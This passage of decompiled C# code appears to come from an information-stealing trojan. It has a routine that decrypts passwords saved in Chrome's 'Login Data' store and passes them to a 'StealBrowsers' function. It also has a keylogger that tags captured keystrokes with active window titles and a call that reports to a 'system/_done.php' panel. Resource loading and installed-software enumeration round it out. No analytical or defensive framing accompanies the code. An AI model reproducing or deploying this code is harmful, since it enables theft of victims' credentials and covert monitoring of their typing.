		SinCommand("uniqueid=" + UniqueID + "&password=" + Password, "system/_done.php");
	}

	public static string MD5(string str)
	{
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		string text = null;
		byte[] bytes = aSCIIEncoding.GetBytes(str);
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = mD5CryptoServiceProvider.ComputeHash(bytes);
		byte[] array2 = array;
		foreach (byte b in array2)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	public static object GetChrome()
	{
		checked
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
				SQLiteHandler sQLiteHandler = new SQLiteHandler(text);
				sQLiteHandler.ReadTable("logins");
				if (File.Exists(text))
				{
					int num = sQLiteHandler.GetRowCount() - 1;
					for (int i = 0; i <= num; i++)
					{
						string value = sQLiteHandler.GetValue(i, "origin_url");
						string value2 = sQLiteHandler.GetValue(i, "username_value");
						string text2 = Decrypt(Encoding.Default.GetBytes(sQLiteHandler.GetValue(i, "password_value")));
						if ((Operators.CompareString(value2, "", false) != 0) & (Operators.CompareString(text2, "", false) != 0))
						{
							StealBrowsers("Google Chrome", value, value2, text2);
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					string text3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
					SQLiteHandler sQLiteHandler2 = new SQLiteHandler(text3);
					sQLiteHandler2.ReadTable("logins");
					if (File.Exists(text3))
					{
						int num2 = sQLiteHandler2.GetRowCount() - 1;
						for (int j = 0; j <= num2; j++)
						{
							sQLiteHandler2.GetValue(j, "origin_url");
							string value3 = sQLiteHandler2.GetValue(j, "username_value");
							string text4 = Decrypt(Encoding.Default.GetBytes(sQLiteHandler2.GetValue(j, "password_value")));
							if ((Operators.CompareString(value3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
							{
								object result = null;
								ProjectData.ClearProjectError();
								return result;
							}
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					object result = "";
					ProjectData.ClearProjectError();
					return result;
				}
				ProjectData.ClearProjectError();
			}
			return null;
		}
	}

	public static string Decrypt(byte[] Datas)
	{
		DATA_BLOB pDataIn = default(DATA_BLOB);
		DATA_BLOB pDataOut = default(DATA_BLOB);
		GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
		pDataIn.pbData = gCHandle.AddrOfPinnedObject();
		pDataIn.cbData = (IntPtr)Datas.Length;
		gCHandle.Free();
		CryptUnprotectData(ref pDataIn, 0, 0, 0, 0, 0, ref pDataOut);
		checked
		{
			byte[] array = new byte[(int)pDataOut.cbData + 1];
			Marshal.Copy(pDataOut.pbData, array, 0, (int)pDataOut.cbData);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

	public static byte[] ReadResource(string filename)
	{
		IntPtr moduleHandleA = GetModuleHandleA(ref filename);
		IntPtr hResInfo = FindResource(moduleHandleA, "0", "RT_RCDATA");
		IntPtr source = LoadResource(moduleHandleA, hResInfo);
		int num = SizeofResource(moduleHandleA, hResInfo);
		byte[] array = new byte[checked(num - 1 + 1)];
		Marshal.Copy(source, array, 0, num);
		return array;
	}

	private static void KH_KeyDown(Keys e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(GetKey(e), (string)null, false) != 0)
		{
			if (Operators.CompareString(strin, GetActiveWindowTitle(), false) != 0)
			{
				Keylogs = Keylogs + "\r\n[-----" + GetActiveWindowTitle() + " @ " + Conversions.ToString(DateTime.Now) + " -----] \r\n";
				strin = GetActiveWindowTitle();
			}
			Keylogs += GetKey(e);
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private static string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string GetKey(Keys e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0384: Expected I4, but got Unknown
		//IL_03aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b0: Expected I4, but got Unknown
		//IL_03bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c6: Expected I4, but got Unknown
		//IL_03d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d8: Expected I4, but got Unknown
		//IL_03e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e9: Expected I4, but got Unknown
		//IL_03f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f8: Expected I4, but got Unknown
		//IL_03fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0404: Expected I4, but got Unknown
		//IL_040f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0412: Unknown result type (might be due to invalid IL or missing references)
		//IL_0418: Expected I4, but got Unknown
		bool capsLock = ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock();
		bool shiftKeyDown = ((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown();
		switch (e - 8)
		{
		case 0:
			return "[BS]";
		case 1:
			return "        ";
		case 5:
			return "\r\n";
		case 19:
			return "[ESC]";
		case 24:
			return " ";
		case 40:
		case 41:
		case 42:
		case 43:
		case 44:
		case 45:
		case 46:
		case 47:
		case 48:
		case 49:
		{
			if (!shiftKeyDown)
			{
				return Conversions.ToString(Strings.Chr((int)e));
			}
			string text = ")!@#$%^&*(";
			return Conversions.ToString(text[checked(e - 48)]);
		}
		case 57:
		case 58:
		case 59:
		case 60:
		case 61:
		case 62:
		case 63:
		case 64:
		case 65:
		case 66:
		case 67:
		case 68:
		case 69:
		case 70:
		case 71:
		case 72:
		case 73:
		case 74:
		case 75:
		case 76:
		case 77:
		case 78:
		case 79:
		case 80:
		case 81:
		case 82:
			if (capsLock)
			{
				if (shiftKeyDown)
				{
					return Conversions.ToString(Strings.LCase(Strings.Chr((int)e)));
				}
				return Conversions.ToString(Strings.Chr((int)e));
			}
			if (shiftKeyDown)
			{
				return Conversions.ToString(Strings.Chr((int)e));
			}
			return Conversions.ToString(Strings.LCase(Strings.Chr((int)e)));
		case 88:
		case 89:
		case 90:
		case 91:
		case 92:
		case 93:
		case 94:
		case 95:
		case 96:
		case 97:
			return Conversions.ToString(Strings.Chr(checked(e - 48)));
		case 98:
			return "*";
		case 99:
			return "+";
		case 101:
			return "-";
		case 102:
			return ".";
		case 103:
			return "/";
		case 104:
			return "[F1]";
		case 105:
			return "[F2]";
		case 106:
			return "[F3]";
		case 107:
			return "[F4]";
		case 108:
			return "[F5]";
		case 109:
			return "[F6]";
		case 110:
			return "[F7]";
		case 111:
			return "[F8]";
		case 112:
			return "[F9]";
		case 113:
			return "[F10]";
		case 114:
			return "[F11]";
		case 115:
			return "[F12]";
		case 178:
			if (shiftKeyDown)
			{
				return ":";
			}
			return ";";
		case 179:
			if (shiftKeyDown)
			{
				return "+";
			}
			return "=";
		case 180:
			if (shiftKeyDown)
			{
				return "<";
			}
			return ",";
		case 181:
			if (shiftKeyDown)
			{
				return "_";
			}
			return "-";
		case 182:
			if (shiftKeyDown)
			{
				return ">";
			}
			return ".";
		case 183:
			if (shiftKeyDown)
			{
				return "?";
			}
			return "/";
		case 184:
			if (shiftKeyDown)
			{
				return "~";
			}
			return "`";
		default:
			return "";
		case 211:
			if (shiftKeyDown)
			{
				return "{";
			}
			return "[";
		case 212:
			if (shiftKeyDown)
			{
				return "|";
			}
			return "\\";
		case 213:
			if (shiftKeyDown)
			{
				return "}";
			}
			return "]";
		case 214:
			if (shiftKeyDown)
			{
				return "\"";
			}
			return "'";
		}
	}

	public static List<AppInfo> GetInstalledApps()
	{
		string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\";
		List<AppInfo> list = new List<AppInfo>();
		string[] subKeyNames = Registry.LocalMachine.OpenSubKey(text)!.GetSubKeyNames();
		foreach (string text2 in subKeyNames)
		{
			list.Add(new AppInfo
			{
				Name = Conversions.ToString(Registry.LocalMachine.OpenSubKey(text + text2 + "\\")!.GetValue("DisplayName")),
				UnInstallPath = Conversions.ToString(Registry.LocalMachine.OpenSubKey(text + text2 + "\\")!.GetValue("UninstallString")),
				SilentUnInstallPath = Conversions.ToString(Registry.LocalMachine.OpenSubKey(text + text2 + "\\")!.GetValue("QuietUninstallString"))
			});
		}
		return list;
	}
}
